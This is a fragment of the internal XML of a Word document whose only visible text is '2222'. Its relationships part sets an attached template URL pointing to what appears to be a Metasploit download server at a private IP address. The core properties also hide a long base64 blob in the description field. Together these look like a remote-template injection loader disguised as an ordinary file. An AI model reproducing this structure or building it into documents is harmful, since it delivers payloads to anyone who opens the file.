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4D" w:rsidRDefault="0051785F">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t>222</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr w:rsidR="003E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5EC" w:rsidRDefault="000155EC" w:rsidP="0051785F">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="000155EC" w:rsidRDefault="000155EC" w:rsidP="0051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5EC" w:rsidRDefault="000155EC" w:rsidP="0051785F">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="000155EC" w:rsidRDefault="000155EC" w:rsidP="00517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0F"/>
    <w:rsid w:val="000155EC"/>
    <w:rsid w:val="003E0B4D"/>
    <w:rsid w:val="0051785F"/>
    <w:rsid w:val="00A6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BF856"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{127EB869-FCC5-4AFC-9D89-C2851490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
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://10.0.106.19:9988/msf/download?f=t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3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bussiness</dc:subject>
  <dc:creator/>
  <cp:keywords/>
  <dc:description>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lQBKAITASACGwEqAhMBHwIgASgCEwEeAhsBLA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kxJQgAAAAAAAAIQeAFUj01P8kAYRc8wb3kfO8WZgnRQQEFBdENCQqKRRN027ppg9N/4/bvNtHzU3Zw7597kUanS0jHOp2rt+zKV70KgUaU71nOlJVVt9RjfNR8S+LcPnhOIAo5M+GnO1cJVKvzfQ9BkuPl7ab5aOAi49hXES7Q04tyFETNDS+4GLUhCvrK5a8TQ2oGHwy2AXbIoBVc+PKQRWp6SbbFdQw+dCnMHR9Gm2i0fHjKj1h68UeEM6LXQcmtz91kkcBwRaic9oD8mdzcWBiu0wHCClntjzFthvgoFp0qFO4zdBmdZeViFH4WDUVdp2QvjTIVGJcB53X8vXFm5sLURmASEaac2VHqX9QRmf/GqmobrDC25+yks8BsAAP//TnU2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=</dc:description>
  <cp:lastModifiedBy>Wei Chen</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-05-25T19:12:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-05-25T19:28:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>